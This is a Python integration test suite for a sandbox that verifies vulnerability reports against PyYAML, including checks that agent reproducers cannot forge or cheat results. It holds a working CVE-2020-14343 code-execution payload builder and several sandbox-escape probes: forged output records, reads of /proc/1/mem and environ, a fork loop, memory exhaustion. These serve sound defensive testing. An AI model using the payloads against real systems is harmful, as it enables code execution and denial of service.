"""Integration tests through the real sandbox. Need Docker (CI provides it).

* every replay gives its expected outcome on both builds;
* W2: each cheat from the audit now fails;
* every isolation property of the container still holds;
* W3: a canary placed in every reporter-controlled field never reaches
  anything an agent can read.
"""

import io
import json
import os
import subprocess
import time
import unittest
from contextlib import redirect_stdout
from unittest import mock

from proveit import actions, cli, evidence, reports, sandbox, store
from tests.helpers import WorkDirTest, replay

DOCKER = sandbox.docker_available()


def ticket_for(stem):
    ticket = reports.parse(replay(stem + ".md"))
    try:
        ticket = reports.merge(ticket, replay(stem + ".followup.md"))
    except FileNotFoundError:
        pass
    return ticket


def code_exec_payload(code):
    """A full_load document that runs `code` through CVE-2020-14343 (works on 5.3.1 only).

    This is how attacker code gets into the sandbox at all: only through the
    library's own bug. The tests use it to attack the harness from inside."""
    return ("!!python/object/new:tuple\n- !!python/object/new:map\n  - !!python/name:exec\n  - [%s]\n"
            % json.dumps(code))


def setUpModule():
    if not DOCKER and os.environ.get("PROVEIT_REQUIRE_DOCKER"):
        raise RuntimeError("PROVEIT_REQUIRE_DOCKER is set but Docker is not available")
    if DOCKER:
        sandbox.build()


@unittest.skipUnless(DOCKER, "Docker is not running")
class ReplayVerdicts(unittest.TestCase):
    EXPECTED = {
        "01-real-cve-2020-14343": ("CODE_EXECUTION", "NOT_REPRODUCED"),
        "02-slop-safe-load-rce": ("NOT_REPRODUCED", "NOT_REPRODUCED"),
        "03-slop-billion-laughs": ("NOT_REPRODUCED", "NOT_REPRODUCED"),
    }

    def test_replays(self):
        for stem, (on_vulnerable, on_patched) in self.EXPECTED.items():
            with self.subTest(stem):
                t = ticket_for(stem)
                vuln = sandbox.run_poc(t.entry_point, t.payload, "vulnerable")
                patched = sandbox.run_poc(t.entry_point, t.payload, "patched")
                self.assertEqual(vuln["outcome"], on_vulnerable, vuln)
                self.assertEqual(patched["outcome"], on_patched, patched)

    def test_real_cve_evidence(self):
        t = ticket_for("01-real-cve-2020-14343")
        run = sandbox.run_poc(t.entry_point, t.payload, "vulnerable")
        self.assertTrue(run["marker_created"])
        frames = [f for e in run["events"] for f in e["library_frames"]]
        self.assertIn("constructor.py:construct_python_object_new", frames)


@unittest.skipUnless(DOCKER, "Docker is not running")
class AuditCheats(unittest.TestCase):
    """W2: each cheat the audit found, and why it now fails."""

    def test_forged_result_record(self):
        # Even with code execution inside the library, the payload cannot write the result:
        # it floods every file descriptor and the parent's stdout with forged records.
        forge = ("import os, json\n"
                 "fake = json.dumps({'outcome': 'CRASH', 'signal': 11, 'library_frames': ['evil.py:forged'],"
                 " 'exception_frames': ['evil.py:forged'], 'events': [{'event': 'exec', 'library_frames': ['evil.py:forged']}]})\n"
                 "line = ('@@PROVEIT ' + '0' * 32 + ' ' + fake + '\\n').encode()\n"
                 "for fd in range(0, 32):\n"
                 "    try: os.write(fd, line)\n"
                 "    except OSError: pass\n"
                 "for path in ('/proc/1/fd/1', '/proc/self/fd/1', '/dev/stdout'):\n"
                 "    try:\n"
                 "        with open(path, 'w') as f: f.write(line.decode())\n"
                 "    except OSError: pass\n")
        for build in ("vulnerable", "patched"):
            run = sandbox.run_poc("full_load", code_exec_payload(forge), build)
            with self.subTest(build):
                self.assertIn(run["outcome"], ("NOT_REPRODUCED", "INCONCLUSIVE"), run)
                self.assertIsNone(run.get("signal"))
                self.assertNotIn("evil.py:forged", json.dumps(run))
                self.assertFalse(run["marker_created"])

    def test_cannot_reach_the_one_time_code(self):
        # The old harness kept the one-time code in the PoC's own process. Now it lives
        # only in the parent, which is non-dumpable. The payload writes the marker
        # (which would make this CODE_EXECUTION) only if it finds any way to it.
        hunt = ("import sys, gc, os, re\n"
                "found = False\n"
                "f = sys._getframe()\n"
                "while f:\n"
                "    found = found or 'nonce' in f.f_locals\n"
                "    f = f.f_back\n"
                "for o in gc.get_objects():\n"
                "    if isinstance(o, dict) and 'nonce' in o: found = True\n"
                "for path in ('/proc/1/mem', '/proc/1/environ', '/proc/1/fd/0', '/proc/1/fd/1'):\n"
                "    try:\n"
                "        open(path, 'rb').close(); found = True\n"
                "    except OSError: pass\n"
                "try:\n"
                "    os.listdir('/proc/1/fd'); found = True\n"
                "except OSError: pass\n"
                "if found: open('/tmp/proveit/marker', 'w').write('x')\n")
        run = sandbox.run_poc("full_load", code_exec_payload(hunt), "vulnerable")
        self.assertEqual(run["outcome"], "NOT_REPRODUCED", run)
        control = sandbox.run_poc("full_load", code_exec_payload("open('/tmp/proveit/marker','w').write('x')\n"), "vulnerable")
        self.assertEqual(control["outcome"], "CODE_EXECUTION", "the hunting payload must have actually run")

    def test_sleep_is_not_a_proof(self):
        # A Python `time.sleep` PoC is rejected before running (tests/test_poc.py). Data cannot sleep;
        # on the patched build the same document is refused by the library.
        sleeper = code_exec_payload("import time\ntime.sleep(60)\n")
        self.assertEqual(sandbox.run_poc("full_load", sleeper, "patched")["outcome"], "NOT_REPRODUCED")
        # On the vulnerable build the sleep only happens because the library ran the payload,
        # and it is reported as resource exhaustion, never as code execution.
        run = sandbox.run_poc("full_load", sleeper, "vulnerable")
        self.assertEqual(run["outcome"], "RESOURCE_EXHAUSTION", run)
        self.assertTrue(run["timed_out"])

    def test_ctypes_crash_is_not_a_proof(self):
        crasher = code_exec_payload("import ctypes\nctypes.string_at(0)\n")
        self.assertEqual(sandbox.run_poc("full_load", crasher, "patched")["outcome"], "NOT_REPRODUCED")
        run = sandbox.run_poc("full_load", crasher, "vulnerable")  # in-library by construction
        self.assertEqual((run["outcome"], run["signal"]), ("CRASH", 11), run)

    def test_unsafe_load_rejected_on_both_builds(self):
        payload = "!!python/object/apply:builtins.open ['/tmp/proveit/marker', 'w']"
        for build in ("vulnerable", "patched"):
            for entry in ("unsafe_load", "load:UnsafeLoader", "load:Loader"):
                run = sandbox.run_poc(entry, payload, build)
                self.assertEqual(run["outcome"], "INVALID_PROOF")
                self.assertFalse(run["ran"])

    def test_marker_cannot_be_written_without_the_library(self):
        for payload in ("/tmp/proveit/marker\n", "write: /tmp/proveit/marker\nmode: w\n",
                        "!!python/object/apply:builtins.open ['/tmp/proveit/marker', 'w']\n"):
            for build in ("vulnerable", "patched"):
                run = sandbox.run_poc("safe_load", payload, build)
                self.assertEqual(run["outcome"], "NOT_REPRODUCED", (payload, build, run))
                self.assertFalse(run["marker_created"])

    def test_memory_exhaustion_is_classified(self):
        hog = code_exec_payload("x = bytearray(400 * 1024 * 1024)\n")
        run = sandbox.run_poc("full_load", hog, "vulnerable")
        self.assertEqual(run["outcome"], "RESOURCE_EXHAUSTION", run)


@unittest.skipUnless(DOCKER, "Docker is not running")
class Isolation(unittest.TestCase):
    """The container's isolation, probed with exactly the flags a real run uses."""

    def probe(self, code):
        result = sandbox.run_probe(code)
        return result["output"].strip()

    def test_unprivileged_user_and_no_capabilities(self):
        out = self.probe("import os\nprint(os.getuid(), os.getgid())\n"
                         "print([l.split()[1] for l in open('/proc/self/status') if l.startswith('CapEff')][0])")
        self.assertEqual(out.splitlines(), ["65534 65534", "0000000000000000"])

    def test_loopback_only_no_network_no_dns(self):
        out = self.probe("import os, socket\nprint(sorted(os.listdir('/sys/class/net')))\n"
                         "for target in (('1.1.1.1', 53), ('8.8.8.8', 443)):\n"
                         "    try:\n"
                         "        socket.create_connection(target, timeout=2); print('OPEN')\n"
                         "    except OSError: print('blocked')\n"
                         "try:\n"
                         "    socket.getaddrinfo('example.com', 80); print('DNS')\n"
                         "except OSError: print('nodns')\n")
        self.assertEqual(out.splitlines(), ["['lo']", "blocked", "blocked", "nodns"])

    def test_no_host_environment(self):
        with mock.patch.dict(os.environ, {"PROVEIT_TEST_SECRET": "should-not-leak", "API_KEY": "nope"}):
            out = self.probe("import os\nprint(sorted(os.environ))")
        self.assertNotIn("PROVEIT_TEST_SECRET", out)
        self.assertNotIn("API_KEY", out)
        self.assertNotIn("should-not-leak", out)

    def test_read_only_root_and_poc_mount(self):
        out = self.probe("mounts = {l.split()[1]: l.split()[3].split(',')[0] for l in open('/proc/mounts')}\n"
                         "print(mounts['/'], mounts['/poc'], mounts['/tmp'])\n"
                         "for path in ('/harness/harness.py', '/poc/x'):\n"
                         "    try:\n"
                         "        open(path, 'a').write('x'); print('WROTE')\n"
                         "    except OSError: print('denied')\n")
        self.assertEqual(out.splitlines(), ["ro ro rw", "denied", "denied"])

    def test_pids_cap(self):
        out = self.probe("import os, time\nn = 0\ntry:\n    while n < 500:\n        if os.fork() == 0:\n"
                         "            time.sleep(3); os._exit(0)\n        n += 1\nexcept OSError: pass\nprint(n)")
        self.assertLess(int(out.splitlines()[-1]), 64)

    def test_container_timeout_and_no_leftovers(self):
        result = sandbox.run_probe("import time\ntime.sleep(60)")
        self.assertTrue(result["timed_out"])
        left = None
        for _ in range(10):  # --rm removal after `docker kill` is asynchronous
            left = subprocess.run(["docker", "ps", "-a", "-q", "--filter", "name=proveit-run-",
                                   "--filter", "name=proveit-probe-"], capture_output=True, text=True).stdout.split()
            if not left:
                break
            time.sleep(1)
        self.assertEqual(left, [])


CANARY = "Zq9CANARYx"
CANARY_REPORT = """Title: {c} title {c}
Severity: critical
Entry point: yaml.full_load
Claimed impact: arbitrary code execution {c} in the impact line

Body text {c} that explains nothing.

```yaml
# comment {c}
{c}key: "{c}value"
tagged: !{c}TAG plain
fn: !!python/name:{c}mod.{c}fn
```
""".format(c=CANARY)


@unittest.skipUnless(DOCKER, "Docker is not running")
class Canary(WorkDirTest):
    """W3: the canary is everywhere a reporter controls; it must be nowhere an agent can read."""

    def cli(self, *argv):
        out = io.StringIO()
        with redirect_stdout(out), mock.patch.dict(os.environ, {"PROVEIT_ACTOR": "agent"}):
            try:
                cli.main(list(argv))
            except SystemExit as exc:
                out.write(str(exc))
        return out.getvalue()

    def test_canary_never_reaches_agents(self):
        agent = self.make_intake()
        self.report(agent, CANARY_REPORT, sender=CANARY + "-reporter")
        tid = store.all_tickets()[0]["id"]
        self.assertEqual(store.load(tid)["status"], "in_triage")
        outputs = [self.cli("check", tid, "--by", "reproducer"),
                   self.cli("check", tid, "--build", "patched", "--by", "reproducer"),
                   self.cli("check", tid, "--loader", "safe_load", "--by", "reproducer"),
                   self.cli("evidence", tid), self.cli("evidence", tid, "--json"), self.cli("show", tid),
                   self.cli("list"), self.cli("tally"), self.cli("tally", "--json"),
                   self.cli("dispute", tid, "--reason", "testing", "--by", "skeptic")]
        record = store.load(tid)
        run = store.load_run(record["runs"][0]["file"])
        self.assertEqual(run["exception_type"], "ConstructorError", "the canary must have reached an exception message")
        self.assertIsNotNone(run["exception_sha256"])
        self.say(agent, "@prove-it-intake evidence %s" % tid)
        self.say(agent, "@prove-it-intake status")
        visible = {
            "ticket.json": (self.tmp / "work" / tid / "ticket.json").read_text(encoding="utf-8"),
            "runs": "".join(p.read_text(encoding="utf-8") for p in (self.tmp / "work" / tid / "runs").glob("*.json")),
            "evidence": evidence.text(evidence.pack(record)) + json.dumps(evidence.pack(record)),
            "triage posts": agent.triage.text(),
            "cli output": "\n".join(outputs),
        }
        for where, text in visible.items():
            self.assertNotIn(CANARY, text, "canary leaked into %s" % where)
            self.assertNotIn(CANARY.lower(), text.lower(), "canary leaked into %s" % where)
        # ...while the private copy for maintainers still has it, so the test is meaningful.
        self.assertIn(CANARY, (self.tmp / "work" / tid / "private" / "report.md").read_text(encoding="utf-8"))


@unittest.skipUnless(DOCKER, "Docker is not running")
class ConsoleFlow(WorkDirTest):
    """W5: in the Console flow the Reproducer's `check` sets reproduced / not_reproduced."""

    def run_cli(self, *argv, agent=True):
        env = {"PROVEIT_ACTOR": "agent"} if agent else {"PROVEIT_ACTOR": ""}
        out = io.StringIO()
        with redirect_stdout(out), mock.patch.dict(os.environ, env):
            try:
                cli.main(list(argv))
                return out.getvalue(), None
            except SystemExit as exc:
                return out.getvalue(), str(exc)

    def submit(self, name, followup=None):
        intake = self.make_intake()
        root = self.report(intake, replay(name))
        if followup:
            self.reply(intake, root, replay(followup))
        return store.all_tickets()[-1]["id"]

    def test_check_sets_states(self):
        real = self.submit("01-real-cve-2020-14343.md")
        slop = self.submit("02-slop-safe-load-rce.md", "02-slop-safe-load-rce.followup.md")
        self.run_cli("check", real, "--by", "reproducer")
        self.run_cli("check", slop, "--by", "reproducer")
        self.assertEqual(store.load(real)["status"], "reproduced")
        self.assertEqual(store.load(slop)["status"], "not_reproduced")
        self.assertEqual([r["build"] for r in store.load(real)["runs"]], ["vulnerable"], "check runs only the vulnerable build")
        out, err = self.run_cli("override", real, "--by", "skeptic")
        self.assertIn("only humans", err)
        out, err = self.run_cli("cost", real, "--usd", "1", "--source", "x")
        self.assertIn("only humans", err)


if __name__ == "__main__":
    unittest.main()
